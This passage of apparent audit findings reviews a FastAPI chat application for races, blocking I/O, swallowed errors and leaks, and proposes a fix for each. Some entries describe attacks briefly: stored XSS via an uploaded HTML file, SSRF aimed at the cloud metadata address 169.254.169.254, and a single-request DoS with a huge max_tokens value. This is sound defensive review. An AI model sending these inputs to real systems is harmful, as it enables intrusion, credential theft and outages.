fix: In cleanup_old_uploads, after removing files, take _index_lock, load the index, drop every entry whose 'path' no longer exists (or whose uploaded_at is past cutoff), and _atomic_write_json the pruned dict. Longer term, replace the whole-file JSON index with SQLite keyed by id and (owner, hash).

title: save_upload swallows index-write failure and returns success, orphaning the upload
detail: The final index update is wrapped in try/except that only logs a warning (lines 658-665), then save_upload returns file_metadata as if everything succeeded. Failure scenario: disk-full/EACCES/corrupt-JSON during _atomic_write_json -> the client gets a 200 with an upload id, but the id is never recorded. With auth configured, resolve_upload then loads info={} (line 392), and the owner check at line 401 compares info.get('owner')=None != owner -> the legitimate owner is permanently denied access to their own just-uploaded file. The bytes sit orphaned on disk until the 30-day cleanup. Silent data loss reported as success.
fix: On index-write failure, os.remove(file_path) and raise HTTPException(500, 'Failed to record upload') instead of logging and returning success. Same treatment is not needed for the last_accessed bump at line 598 (benign), but the primary insert must be fatal.

title: _find_upload_path does a full os.walk of the entire upload tree per lookup
detail: When the stored 'path' in the index is missing or stale (guaranteed common once cleanup or the swallowed-write bug above produces dangling entries), resolve_upload falls back to _find_upload_path, which walks every year/month/day directory and every file under upload_dir looking for one filename (lines 364-368). Failure scenario: with a few hundred thousand accumulated files, each chat message referencing an unresolvable upload id costs a full directory-tree scan (O(total files), disk-bound), and this runs inside a request handler; a handful of requests with dangling ids can saturate I/O and stall the worker threadpool.
fix: Store and trust the date path: derive candidate directories from the entry's uploaded_at date, or maintain an id->path map in the index so lookup is O(1). If the file is not at its recorded path, treat it as gone rather than scanning the tree.

title: Dedupe check and index insert are in separate lock sections: concurrent identical uploads leak a file
detail: The duplicate lookup runs under _index_lock (lines 553-571), but the lock is released before the file is written to disk and re-acquired for the insert at line 658. The comment at lines 546-549 claims the lookup and write happen under one lock, but they do not. Failure scenario: two threads upload the same bytes for the same owner concurrently; both pass the dedupe check (no entry yet), both write separate physical files (distinct uuid names), then both insert under the identical storage_key f'{owner}:{file_hash}' — the second insert overwrites the first's metadata, and the first physical file becomes an unreferenced orphan on disk until the 30-day cleanup. Repeated by a client that fires parallel retries, this steadily leaks disk space.
fix: After acquiring _index_lock for the insert (line 658), re-check whether storage_key already exists; if it does, delete the just-written file_path and return the existing entry as a duplicate instead of overwriting it.

title: Rate-limit cleanup trigger reads _upload_rate_counter outside the lock
detail: self._upload_rate_counter is incremented under _upload_rate_lock (line 508) but the 'counter % 100 == 0' check at line 510 re-reads the shared counter outside the lock. Failure scenario: threads A and B increment to 100 and 101; by the time A evaluates the check the counter is 101 and B also sees 101 — both skip, so cleanup_rate_limits does not run until 200. Since per-IP pruning at lines 496-499 only touches the uploading IP, entries for IPs that stop uploading linger longer than intended; under sustained concurrency the trigger can be skipped repeatedly, letting upload_rate_log grow past its intended cadence (bounded only by the eventual lucky exact-read and the 1000-entry cap).
fix: Capture the post-increment value while still holding the lock (my_count = self._upload_rate_counter inside the with block) and test my_count % 100 == 0 outside it.

title: Blacklist-based file-type policy admits HTML/SVG, and MIME is later re-derived from extension
detail: is_safe_file_type (lines 225-246) is a denylist; .html, .htm, .svg, .js survive it (.html/.htm are even whitelisted as documents at line 182, and text/javascript content sniffed by libmagic is not in dangerous_types — only 'application/javascript' is). The stored file id preserves the user extension (line 61), and resolve_upload fills a missing mime from mimetypes.guess_type(path) (line 422), i.e. from that extension. Failure scenario: an attacker uploads evil.html containing script; if any download/serve route uses the resolved mime without forcing Content-Disposition: attachment or a safe Content-Type, the file is served inline as text/html on the app origin — stored XSS with the victim's session. The risk depends on the serving route (outside this file), but this file is the layer that claims to enforce 'safe to store and serve'.
fix: Either strip/neutralize the extension on stored ids for non-image types, extend the denylist to .html/.htm/.svg (or switch to an allowlist of served-inline types), and never derive the served Content-Type from the user-controlled extension — store the sniffed type and serve everything else as application/octet-stream with Content-Disposition: attachment.

title: Client-controlled max_tokens is uncapped, enabling resource-exhaustion DoS
detail: max_new_tokens = int(payload.max_tokens or 256) trusts the request body with no upper bound (and no lower bound: negative values raise inside transformers and return a 500). A single POST to /v1/chat/completions with {"max_tokens": 10000000} makes model.generate loop for millions of decode steps, pinning the CPU/GPU and growing the output tensor and KV cache until the request effectively never returns or the process OOMs. Default bind is 127.0.0.1 but --host allows 0.0.0.0, at which point any network peer can wedge the server with one request.
fix: Clamp the value, e.g. max_new_tokens = min(max(1, int(payload.max_tokens or 256)), 1024), or use pydantic Field(ge=1, le=1024) on ChatCompletionRequest.max_tokens.

title: Concurrent requests run model.generate in parallel threads with no concurrency limit
detail: chat_completions is a sync def, so FastAPI dispatches each request on the threadpool (default ~40 threads). N simultaneous requests execute N model.generate calls on the same model at once. On CUDA this multiplies activation + KV-cache memory per in-flight request and readily triggers torch.cuda.OutOfMemoryError, which then 500s every subsequent request; on CPU it oversubscribes cores (each generate already uses intra-op torch threads), collapsing throughput for all callers. There is no lock, semaphore, or queue serializing access to the shared model.
fix: Serialize or bound inference: create gen_lock = threading.Lock() in create_app and wrap the tokenizer+generate block in `with gen_lock:`, or use a threading.Semaphore(k) sized to available memory.

title: stream=True is silently ignored, breaking OpenAI streaming clients
detail: ChatCompletionRequest declares stream but chat_completions never checks it and always returns a plain JSON chat.completion object. An OpenAI SDK client calling with stream=True expects an SSE body of chat.completion.chunk events; it instead receives a non-SSE JSON response and fails while iterating the stream (or hangs waiting for `data:` lines), with no hint from the server that streaming is unsupported. Since Atenea points OpenAI-compatible clients at this server, any code path that enables streaming silently breaks.
fix: In chat_completions, reject unsupported mode explicitly: `if payload.stream: raise HTTPException(status_code=400, detail="stream=true is not supported by hf-local backend")` (or implement SSE chunk responses).

title: Sync HTTP call to model endpoint inside async handler blocks the event loop
detail: `get_context_info` is `async def`, but `get_context_length()` (src/chat/model_context.py) performs synchronous network I/O via `httpx.get(...)` (e.g. the llama.cpp `/slots` probe at model_context.py:281 and /v1/models catalog fetches), with timeout REQUEST_TIMEOUT. Because the handler is async, FastAPI runs it directly on the event loop, so a slow/unreachable endpoint freezes EVERY request on the server for up to the full timeout (~20s), including streaming chats. This endpoint is hit whenever a session's context meter is rendered, so one flaky endpoint stalls the whole app. Cache misses on local endpoints re-query every call, so this is not a one-time cost.
fix: Either make the handler a plain `def` (FastAPI will run it in the threadpool) or wrap the call: `ctx = await anyio.to_thread.run_sync(get_context_length, session.endpoint_url, session.model)` / `await asyncio.to_thread(...)`.

title: compact_session lost-update race: messages sent during the 60s LLM call are silently deleted
detail: `compact_session` snapshots `history = list(session.history)` at line 924, then awaits `llm_call_async(...)` for up to 60s (line 961), then calls `session_manager.replace_messages(session_id, new_history)` at line 984, which DELETEs all persisted messages and rewrites them from the stale snapshot. `_reject_compact_during_active_run` (line 922) only checks for an active run BEFORE the await; a chat run started (or a group-chat `inject_messages` call made) during the 60-second window is not re-checked, so any messages appended in that window are permanently destroyed by the replace. Concrete scenario: user clicks Compact, then sends a message 5s later while the summary is generating — the new user+assistant turns vanish from both DB and memory when the summary lands.
fix: Re-check `agent_runs.is_active(session_id)` and re-read `session.history` after the await; abort (409) if the history length/tail changed since the snapshot, or compute `recent` from the fresh history so appended messages are preserved in `new_history`.

title: Incognito purge in list_sessions deletes LIVE sessions older than 10 minutes, across all users
detail: The lazy purge filters on `DbSession.created_at < cutoff` (10 minutes). An incognito ('Nobody'/'Incognito') session that has been actively chatting for 11+ minutes is deleted — messages included — by the very next `/api/sessions` call from ANY user, killing the in-flight chat mid-conversation. The comment (lines 221-227) claims the guard protects the active session, but it only protects sessions *created* recently, not sessions *used* recently. Additionally the purge query has no owner filter, so user A's request deletes user B's incognito sessions (cross-tenant destructive write outside the row-owner model used everywhere else in this file).
fix: Filter on `last_message_at < cutoff` (falling back to `updated_at`/`created_at`) instead of `created_at`, so activity refreshes the grace window; optionally also skip sessions with an active run via `agent_runs.is_active(id)`.

title: Sync DB work (SessionLocal + delete_session) inside async bulk_delete_sessions blocks the event loop
detail: `bulk_delete_sessions` is `async def` but performs, per id: `_verify_session_owner` (sync SQLite query, line 559), a `SessionLocal()` starred-check query (line 562-568), and `session_manager.delete_session(sid)` (line 570), which itself runs 3+ sync DELETE statements. All of this executes on the event loop. Deleting the ~50 helper sessions a compare cleanup can accumulate means 200+ sequential blocking SQLite operations stalling every other request; under SQLite write-lock contention with an active chat persisting messages, each write can block for the busy-timeout, freezing the server for seconds.
fix: Make the handler `def` (threadpool) after replacing `await request.json()` with a Pydantic body model, or wrap the loop body in `await asyncio.to_thread(...)`. Same pattern applies to `inject_messages` (line 528-541, per-message sync `_persist_message` INSERTs) and `mark_session_important` (line 878-909).

title: N+1 query in auto-sort throwaway detection: one first-message query per candidate session
detail: Inside the per-row loop of `auto_sort_sessions`, every non-important session with 1-4 messages triggers `db.query(DbMsg.content).filter(DbMsg.session_id == row.id, ...).order_by(DbMsg.timestamp).first()`. The commit at lines 1026-1029 explicitly fixed this class of problem for the count queries but left this one: with the 2000-row cap and a user whose chats are mostly short (the common case for the tidy feature), this is up to ~2000 sequential queries per Tidy click, each an ORDER BY over that session's messages — exactly the 'thousands of round-trips blowing the timeout' failure the adjacent comment describes.
fix: Precompute first user messages in one query before the loop, e.g. a window-function or `group_by(DbMsg.session_id)` query selecting `min(timestamp)` rows for sessions with count <= 4, building a `{session_id: first_text}` dict.

title: SSRF: raw endpoint_url accepted without restriction when auth is disabled
detail: `_reject_raw_endpoint_url_for_non_admin` only rejects when `user and not _current_user_is_admin(...)`. With AUTH_ENABLED=false (user is None), any unauthenticated request to POST /api/session or PATCH /api/session/{sid} with an arbitrary `endpoint_url` makes the server issue outbound requests to it via `list_model_ids` (lines 374, 394) and later chat calls — e.g. `endpoint_url=http://169.254.169.254/latest/meta-data/` or internal-network hosts, with attacker-chosen `api_key` placed in the Authorization header. On a QA/dev instance exposed beyond localhost this is a classic SSRF pivot into the internal network.
fix: Treat the no-user case like non-admin (require a registered endpoint), or validate raw URLs against an allowlist / block private and link-local address ranges before probing.

title: Non-Latin-1 session names crash export with 500 via Content-Disposition header
detail: `safe_name = re.sub(r'[^\w\-_]', '_', session.name)` uses `\w`, which in Python matches Unicode word characters, so a session named '日本語チャット' or 'Résumé notes' keeps those characters. `out_name` is then placed in the Content-Disposition header (lines 782/795/820/841); Starlette encodes response headers as latin-1, so any non-latin-1 name raises UnicodeEncodeError and the export returns a 500 for every format whenever `filename` is not supplied. (No header injection: `\w` excludes CR/LF/quote/semicolon, and the explicit `filename` param goes through the strict `_sanitize_export_filename`.)
fix: Reuse `_sanitize_export_filename` (ASCII whitelist) for `safe_name`, or add re.ASCII: `re.sub(r'[^\w\-_]', '_', session.name, flags=re.ASCII)`, or emit an RFC 5987 `filename*=UTF-8''...` header.

title: bulk_delete_sessions swallows every per-id exception, hiding systemic failures
detail: The bare `except Exception: pass` around each id (lines 572-573) is intended to skip not-owned/starred sessions, but it also silently absorbs real failures — e.g. SQLite 'database is locked' or an exception inside `session_manager.delete_session` — so a request can return `{"deleted": 0}` with nothing logged, leaving 'deleted' compare helper sessions accumulating forever with no diagnostic trail.
fix: Catch `HTTPException` (ownership/starred skips) separately and `continue`; for other exceptions at least `logger.warning("bulk-delete failed for %s: %s", sid, e)` before continuing.

title: Race on self._extra_ports between _get_hosts() and discover_models()
detail: self._extra_ports is instance state that _get_hosts() resets to an empty set (line 100) and fills as a side effect, and discover_models() later reads (line 242). A ModelDiscovery instance shared across requests (the normal FastAPI singleton pattern) has a race: request A finishes _get_hosts() and is building its port list when request B enters _get_hosts() and executes 'self._extra_ports = set()' — A then reads the cleared/half-repopulated set. Failure scenario: OLLAMA_BASE_URL=http://gpubox:11434 is configured on a non-default port variant (e.g. :11500); under two concurrent discovery calls, one call scans without port 11500 and silently fails to find the configured Ollama server, producing an intermittently empty discovery result that is very hard to reproduce.
fix: Make port collection local: have _get_hosts() return (hosts, extra_ports) (or have _append_env_hosts append to a local set passed in) and pass extra_ports into discover_models()'s port-list construction, removing the self._extra_ports instance attribute entirely.

title: Dedupe key omits host, silently dropping distinct machines with identical model lists
detail: seen_models keys on (port, sorted(model_ids)) only. Two different machines running the same server on the same port with the same models are collapsed into one, and one real endpoint is silently discarded — whichever future completes second. Failure scenario: two Tailscale peers both run Ollama on 11434 and both pulled llama3:8b (the default setup on multiple dev machines); discovery reports only one of them, and which one appears is nondeterministic across calls (as_completed ordering). The empty-server path makes it worse: every model-less Ollama server returns models=[], so the key (11434, ()) dedupes ALL fresh Ollama installs down to a single arbitrary host, defeating the stated purpose of the /api/version branch ('surface server so Admin -> Discover can add it').
fix: Dedupe only what the comment intends — the same machine reachable via multiple IPs. Include a machine identity in the key, e.g. resolve/canonicalize the IP, or key on (port, models) only when two candidate hosts are known aliases (self IP vs host.docker.internal vs 127.0.0.1); otherwise include host in the key: (host, port, tuple(sorted(models))).

title: discover_tailscale_hosts() returns the cache list itself; _get_hosts() mutates the cache in place
detail: On a cache-miss, line 79 stores the 'hosts' list into the module-global _hosts_cache and line 87 returns that same object. _get_hosts() then mutates the returned list (insert(0, default_host) at line 138, _append_host/_append_env_hosts at lines 139-140), which mutates the cached list. Two consequences: (1) cache pollution — for the rest of the TTL, _hosts_cache contains default_host, host.docker.internal and env-derived hosts that are not Tailscale peers, so the 'if ts_hosts' truthiness and the discovery log line report wrong data, and if the LLM_HOSTS/OLLAMA_* env changes between calls the stale env host stays baked into the 'Tailscale' cache; (2) a data race — another thread executing 'list(_hosts_cache)' at line 42 while this thread is mid-insert can copy an inconsistent snapshot. The global cache write itself (lines 79-80) is also unlocked, so N concurrent first calls each spawn a redundant 'tailscale status' subprocess.
fix: Return a copy from the cached producer: 'return list(hosts)' at line 87 (line 42 already copies), or have _get_hosts() do 'ts_hosts = list(discover_tailscale_hosts())'. Guard the cache read/write with a threading.Lock to serialize the subprocess refresh.

title: Full unthrottled port sweep on every call, worst case minutes on packet-dropping networks
detail: discover_models() rescans 24 ports x every host on every invocation — only the Tailscale host list is cached (60s), never the scan results — and get_providers() calls it unconditionally, so a UI that lists providers triggers a fresh sweep each time. _check_port makes up to 3 sequential HTTP requests per target with timeouts 3s + 2.5s + 1.8s (plus 1.5s fingerprint). Against hosts that silently DROP packets (typical for firewalled Tailscale peers or an absent host.docker.internal on native Linux), each attempt burns the full timeout: 10 peers x 24 ports = 240 targets at ~7.3s each over 50 workers is roughly 35 seconds per call, and a single unreachable host still costs ~3.5s minimum. If this sync method is invoked from an async FastAPI handler without a threadpool offload it also stalls the event loop for that entire duration. Failure scenario: admin opens the provider page twice in a row on a tailnet with several sleeping laptops; each render blocks for tens of seconds and spawns 50 threads, all rediscovering identical results.
fix: Cache discover_models() results with a short TTL (mirroring _hosts_cache), reuse one httpx.Client per _check_port (connection reuse also collapses the per-request TCP handshake cost), lower the connect timeout via httpx.Timeout(connect=0.5, ...) so DROPped hosts fail fast, and if any async route calls this, wrap it in await anyio.to_thread.run_sync(...).

title: Malformed provider env URLs silently ignored
detail: _append_env_hosts wraps urlparse in 'except Exception: pass'. A user who sets OLLAMA_BASE_URL to a malformed value (e.g. 'http://[bad' which raises ValueError from urlparse, or a value whose .port property raises for an out-of-range port like 'host:99999') gets the host silently dropped with no log line — discovery just never finds their server, and nothing in the logs explains why. Combined with the identical silent-pass blocks at lines 164-165, 186-187 and 227-228 this file has no diagnostic trail at all for 'my configured server was not discovered'.
fix: Replace the bare pass with logger.warning(f"Ignoring invalid {env_name}={raw!r}: {e}") and narrow the except to ValueError. In _check_port, log at debug level on exception so a misbehaving-but-reachable server (e.g. JSON decode error) is distinguishable from connection-refused.

title: _read_output loads the entire log file into memory before truncating
detail: Path(rec['log_path']).read_text(...) reads the whole log into RAM and only then slices it to 16 KB (lines 167-171). Background jobs are explicitly long-running installs/ffmpeg/model downloads; a verbose or looping job (e.g. ffmpeg with progress spam, or a command that cats a large file) can produce multi-GB logs. Every call to get(), result_text(), and the monitor's follow-up path then allocates gigabytes and can OOM-kill the uvicorn process — taking down the whole app because of one noisy background job. This is called from request handlers via get()/list paths, so it also stalls the event loop while reading.
fix: Open the file in binary, stat() it, read only the first _MAX_OUTPUT_CHARS//2 bytes and seek() to read the last _MAX_OUTPUT_CHARS//2 bytes, then decode with errors='replace'. Never read more than ~16 KB regardless of file size.

title: Timeout reaper can kill an unrelated recycled PID after a server restart
detail: The design is explicitly restart-safe: records (with raw PIDs) survive uvicorn restarts, and on Linux PIDs are recycled quickly. Failure scenario: server (or machine) restarts; the wrapper bash died without writing the .exit file; the OS reassigns that PID to an unrelated process (another service, or a different tenant's job). pid_alive() at line 218 returns True, so the 'died' branch never fires; once max_runtime_s elapses, line 212 calls kill_process_tree() on the recycled PID and terminates an innocent process tree.
fix: Store the process start time (e.g. from /proc/<pid>/stat on Linux, psutil.Process(pid).create_time() cross-platform) in the record at launch, and before killing verify the live process's start time matches (within a small epsilon). If it doesn't match, treat the job as died instead of killing.

title: Race reading the exit file: partially-written (empty) file marks a successful job as failed
detail: The wrapper writes the exit code with `echo $? > exit_path` (line 115): the shell's `>` redirection creates/truncates the file first, then echo writes in a separate syscall. If refresh() polls in that window, exit_path.exists() is True but read_text() returns '', and `.strip() or "1"` coerces it to exit code 1 — a job that actually exited 0 is permanently recorded as status='failed' with exit_code=1, and the agent receives a false failure follow-up (potentially retrying an install that already succeeded).
fix: Make the exit-file write atomic in the wrapper script: `echo $? > exit_path.tmp && mv exit_path.tmp exit_path`. Alternatively in refresh(), treat an empty/unparsable exit file as 'not finished yet' (skip this tick) rather than defaulting to 1.

title: get() returns any job's command and full output with no session-ownership check
detail: Records carry session_id and list_for_session() filters by it, showing per-session scoping is intended — but get(job_id) takes no session_id and returns the record including the stored command line and its captured output for any job. If the calling API layer forwards a client-supplied job_id (the natural use of this accessor) without its own check, one session/user can read another session's job output — command lines and logs routinely contain tokens, env dumps, and file contents. The 12-hex job_id (48 bits) also leaks via the store file and follow-up messages, so it is not a secret capability.
fix: Change the signature to get(job_id, session_id) and return None when rec.get('session_id') != session_id (callers that legitimately need cross-session access can pass a sentinel), so ownership is enforced at the data layer instead of hoping every endpoint remembers to.

title: _load() swallows store corruption, silently orphaning all running jobs
detail: except Exception: pass at lines 64-65 turns a corrupted/unreadable BG_JOBS_FILE (bad JSON from a crashed write, permission error, disk issue) into an empty store with no log line. Every subsequent _load->_save cycle then persists the empty dict, permanently discarding all records: running processes keep running unmonitored (no timeout reap), finished jobs never trigger follow-ups (violating the module's 'completion can never silently do nothing' guarantee), and their .log/.sh/.exit files are never pruned.
fix: Log the exception (logger.exception) before falling back, and quarantine the corrupt file (rename to bg_jobs.json.corrupt-<ts>) so operators can see why jobs vanished and recover records; optionally rebuild records from surviving <id>.exit/<id>.log files in BG_JOBS_DIR.

title: Fire-and-forget asyncio.create_task with no retained reference — exceptions silently dropped, task may be GC'd
detail: `asyncio.create_task(webhook_manager.fire(...))` creates a task and immediately discards the only reference to it. Per asyncio's documented pitfall, a task with no strong reference held elsewhere is only weakly referenced by the event loop and can be garbage-collected mid-execution, silently aborting the webhook delivery. Additionally, if `webhook_manager.fire` raises, the exception is never retrieved/awaited, so it is swallowed (at best surfacing as an "exception was never retrieved" warning in logs, easy to miss) — outbound webhooks can fail with zero operator visibility. Fix: keep a module-level `set()` of background tasks, add the task to it, and register a `task.add_done_callback(background_tasks.discard)` (plus log exceptions in the callback) so the task is both kept alive and its failures are observable.
failure_scenario: Under load or when webhook_manager.fire raises (e.g. delivery URL times out), the fire-and-forget task's exception is dropped and no chat.completed webhook is delivered, with no error surfaced anywhere in logs.

title: Overly broad exception handling converts real errors into misleading responses with zero logging
detail: `except (KeyError, Exception):` at line 257 is equivalent to bare `except Exception`, catching literally any error from `session_manager.get_session` (a DB error, a programming bug, an unexpected type) and reporting it to the caller as "Session not found" (404) — this masks operational failures as a client-side lookup miss. The same pattern recurs at lines 332-333 (`except Exception: raise HTTPException(500, "Could not resolve endpoint credentials")`) and 355-356 (`except Exception: raise HTTPException(500, "Could not discover models from endpoint")`), none of which log the original exception even though the module defines `logger = logging.getLogger(__name__)` at line 16 — grep confirms `logger` is never referenced anywhere else in the file. Fix: catch narrower exception types where feasible, and in each except block call `logger.exception(...)` (or at least `logger.error(str(e))`) before converting to the HTTP response, so root causes are diagnosable instead of being permanently discarded.
failure_scenario: A transient DB outage or a bug in session_manager.get_session raises an unrelated exception (e.g. AttributeError); the caller sees a generic 'Session not found' 404 and nothing is logged anywhere, making the real outage invisible to operators until users report broad failures.

title: Lost-update race when writing cookbook_state.json back to disk
detail: `_tick()` reads the whole state file into `state`/`tasks` at line 138, then — after awaiting network calls to stop each serve (up to several seconds each, line 164) — writes the *entire* `state` dict back with `atomic_write_json(state_path, state)` at line 182. The comment at lines 160-161 claims 'Re-read state once before writing so we capture any updates from concurrent UI syncs,' but no re-read actually occurs; the code just reuses the `tasks` object captured before the awaits. Other modules (routes/cookbook_routes.py, src/tools/implementations.py, src/chat/agent_loop.py, src/actions/builtin.py) also read-modify-write the same COOKBOOK_STATE_FILE. Concrete failure: a user starts a new cookbook serve (or edits an existing task) via the UI while this loop is in the middle of stopping an expired serve (awaiting the ssh/tmux kill + endpoint delete, which can take up to ~15s per call). When the loop's write lands after the UI's write, it clobbers the UI's update with the stale snapshot taken at the top of `_tick`, silently reverting or losing the concurrent change (e.g. a newly-launched task's entry disappears, or a status flip performed elsewhere is undone).
fix: Re-read the state file immediately before writing (as the comment claims to do), and merge only the specific fields this tick actually changed (status/_scheduledStopAtMs/_lastStatusFlipAt for the stopped session IDs) into the freshly-read tasks list, rather than writing back the entire stale `tasks` array captured before the awaits. Alternatively take a file lock (e.g. via a lockfile or `core.atomic_io` helper) shared with the other writers of COOKBOOK_STATE_FILE for the whole read-modify-write section.

title: Synchronous file I/O blocks the event loop on every tick
detail: `state_path.read_text(...)` (line 138) and `atomic_write_json` (line 182, which does a synchronous write+os.replace under the hood) run inside `async def _tick()` without being offloaded to a thread. This runs every 60 seconds forever (line 195) on the main event loop, so any slow disk (e.g. network-mounted DATA_DIR) or a large state file stalls all other coroutines (chat requests, other endpoints) for the duration of the read/write.
fix: Wrap the read and the atomic_write_json call with `await asyncio.to_thread(...)` so the blocking file I/O runs off the event loop.

title: Silent exception swallowing during embedding-endpoint switch hides real reset failures
detail: In set_endpoint (lines 308-322) and clear_endpoint (lines 349-363), each of the four cache/singleton resets (reset_http_embed_state, reset_embedding_lane_state, reset_tool_index, reset_client) is wrapped in `except Exception: pass` with no logging at all. Concrete failure: admin switches the embedding endpoint from provider A to provider B; reset_client() raises (e.g. ChromaDB file lock held by another request) so the old Chroma client/collection persists with A's embedding dimensionality while new documents get embedded with B's model. The endpoint switch is reported as `{"success": true}` and nothing appears in the logs, so subsequent vector-search errors or silent quality degradation have no diagnosable root cause — the operator has no way to know the reset step failed.
fix: Replace bare `except Exception: pass` with `except Exception: logger.exception("failed to reset <component> after embedding endpoint change")` for each of the four reset calls in both set_endpoint and clear_endpoint, so failures are at least visible in logs even if non-fatal to the request.

title: _load_custom_endpoint silently discards config-read/parse errors
detail: Lines 97-102: any exception while reading or json.loads-ing the endpoint file (corrupted/partial JSON, permission error, etc.) is swallowed by a bare `except Exception: pass`, silently returning {}. Since _save_custom_endpoint (line 106-108) is not an atomic write (no temp-file + rename), a crash or concurrent write mid-write can leave truncated JSON. On next load, get_endpoint() would then silently report the custom endpoint as inactive/cleared instead of surfacing that the config is corrupt, misleading the admin into thinking they need to reconfigure from scratch with no error indicating why the previously-saved endpoint disappeared.
fix: Log the exception (logger.warning/exception) before returning {} so a corrupted config file is diagnosable, and consider writing via a temp file + os.replace in _save_custom_endpoint to avoid partial writes.

title: Synchronous DNS resolution blocks the event loop on every webhook delivery
detail: `_deliver` (async, line 252) calls `validate_webhook_url(url)` at line 256, which for any non-IP-literal hostname calls `_is_private_url` -> `_resolve_hostname_ips` (line 62-76), which does a plain synchronous `socket.getaddrinfo(hostname, None)` (line 66). This is blocking I/O executed directly inside a coroutine with no `run_in_executor`/`asyncio.to_thread`. Because `fire()` schedules one `_deliver` task per matching webhook and this validation runs on every single delivery (not just at webhook creation, per the docstring comment at line 84 'Re-checked at delivery time too'), a slow, unresponsive, or non-existent DNS name configured by any user's webhook (or a timeout during a rebinding/adversarial DNS setup) stalls `getaddrinfo`, which freezes the *entire* asyncio event loop — i.e. all other concurrent requests, chats, and background tasks in the FastAPI app — for however long the OS resolver takes (can be several seconds up to the OS default timeout).
fix: Run the resolution off the event loop, e.g. `addrs = await asyncio.get_running_loop().getaddrinfo(hostname, None)` or wrap `_resolve_hostname_ips` with `await asyncio.to_thread(_resolve_hostname_ips, hostname)`, and make `_is_private_url`/`validate_webhook_url` async so `_deliver` awaits them instead of calling them synchronously.

title: Fire-and-forget asyncio tasks are not referenced, risking silent GC cancellation
detail: `fire()` (line 245) does `asyncio.create_task(self._deliver(...))` for each matching webhook, and `fire_and_forget()` (line 226) does `loop.create_task(self.fire(event, payload))` — in both cases the returned Task object is discarded immediately with no strong reference kept anywhere (no module-level set, no `WebhookManager` attribute). Per the asyncio docs, a task with no external strong reference can be garbage-collected mid-execution (the event loop only holds a weak reference), which can silently abort webhook delivery before the HTTP POST completes, with no exception logged and no way to diagnose why a webhook intermittently never fires.
fix: Keep the tasks alive, e.g. maintain `self._background_tasks: set[asyncio.Task] = set()`, then `t = asyncio.create_task(...); self._background_tasks.add(t); t.add_done_callback(self._background_tasks.discard)` at both call sites (lines 226 and 245).

title: DB session/connection held open for the full duration of the outbound HTTP webhook call
detail: In `_deliver` (line 271) `db = SessionLocal()` is opened *before* `await self._client.post(url, ...)` (line 273), so the checked-out DB connection sits idle-but-held for up to the full `timeout=10` seconds of the outbound request to an arbitrary (potentially slow/unresponsive) remote URL. Since `fire()` spawns one concurrent `_deliver` task per matching webhook (line 245) with no concurrency cap, a tenant with several webhooks pointed at a slow endpoint can hold several DB pool connections simultaneously for ~10s each, competing with/starving unrelated request-handling DB queries in the rest of the app.
fix: Open the DB session only after the HTTP call completes (move `db = SessionLocal()` to just before the `db.query(...).update(...)` calls in both the try and except branches, i.e. after line 273's `await` resolves), so the connection is held only for the brief DB update, not the network round-trip.

title: Synchronous, long-timeout VL model HTTP call runs directly on the event loop
detail: In `preprocess_message` (an `async def`), `analyze_image_with_vl_result(file_info["path"], owner=owner)` is called directly, not via `await asyncio.to_thread(...)` — unlike the sibling call to `model_supports_vision` three lines above at line 179, which is correctly offloaded. `analyze_image_with_vl_result` (src/documents/processor.py:284-334) does a synchronous file read + base64 encode and then calls `llm_call(..., timeout=120)` in a loop over multiple fallback candidates (src/documents/processor.py:298-334) — i.e. it can block for up to 120 seconds per candidate, potentially several minutes total.
